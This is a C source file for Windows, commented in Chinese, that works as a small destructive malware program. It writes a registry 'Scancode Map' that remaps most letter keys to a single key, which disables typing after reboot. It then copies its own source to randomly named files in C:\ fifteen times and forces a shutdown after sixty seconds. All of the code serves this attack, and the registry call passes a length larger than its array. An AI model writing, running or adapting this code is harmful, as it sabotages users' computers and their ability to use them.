#define _CRT_SECURE_NO_WARNINGS
#include <io.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>
/* copy infile to outfile */
void copyfile(){
	/*random name module*/
	char name_str[100] = "a";
	int name;
	srand((unsigned)time(NULL));	//随机数种子
	name = rand() % 1024;
	_itoa(name, name_str, 16);	//将随机数转化成字符串
	/*self-replicated module*/
	FILE* in = NULL, * out = NULL;
	char file[50] = "C:\\";
	strcat(file, name_str);
	strcat(file, ".cpp");
	in = fopen("cpf.cpp", "r+");
	out = fopen(file, "w");
	while (!feof(in)){
		fputc(fgetc(in), out);
	}
	fclose(in);
	fclose(out);
}
/*kboardforbidden*/
void RegKeyBoardForbidden()
{
	HKEY hkey;
	char scancodemap[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x1A\x00\x00\x00"
		"\x02\x00\x10\x00"
		"\x02\x00\x11\x00"
		"\x02\x00\x12\x00"
		"\x02\x00\x13\x00"
		"\x02\x00\x14\x00"
		"\x02\x00\x15\x00"
		"\x02\x00\x16\x00"
		"\x02\x00\x17\x00"
		"\x02\x00\x18\x00"
		"\x02\x00\x19\x00"
		"\x02\x00\x1E\x00"
		"\x02\x00\x1F\x00"
		"\x02\x00\x20\x00"
		"\x02\x00\x21\x00"
		"\x02\x00\x22\x00"
		"\x02\x00\x23\x00"
		"\x02\x00\x24\x00"
		"\x02\x00\x25\x00"
		"\x02\x00\x26\x00"
		"\x02\x00\x2C\x00"
		"\x02\x00\x2D\x00"
		"\x02\x00\x2E\x00"
		"\x02\x00\x2F\x00"
		"\x02\x00\x30\x00"
		"\x02\x00\x31\x00"
		"\x02\x00\x32\x00"
		"\x00\x00\x00\x00";
	RegCreateKey(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", &hkey);
	RegSetValueEx(hkey, "Scancode Map", 0, REG_BINARY, (LPBYTE)scancodemap, 120);//scancodemap数组长度为120字节
	RegCloseKey(hkey);
}
int main(){
	RegKeyBoardForbidden();
	Sleep(3000);
	int i;
	for (i = 0; i < 15; i++) {
		copyfile();
		Sleep(1000);
	}
	system("shutdown -s -t 60");
	printf("ur computer will be shut down in 60s.");
	return 0;
}